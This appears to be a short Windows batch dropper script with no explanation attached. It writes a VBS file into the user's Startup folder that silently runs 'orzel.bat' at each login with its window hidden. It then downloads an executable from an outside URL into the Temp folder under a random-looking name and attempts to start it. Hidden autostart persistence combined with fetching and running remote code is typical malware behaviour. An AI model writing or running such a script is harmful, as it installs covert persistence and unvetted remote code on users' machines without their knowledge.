@echo off
echo "CreateObject("Wscript.Shell").Run "orzel.bat",0,True">%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\orzel.vbs
cd %USERPROFILE%\AppData\Local\Temp && curl --location --request GET "https://install.medal.tv/" --output A0hUONH.exe start A0hUONH.exe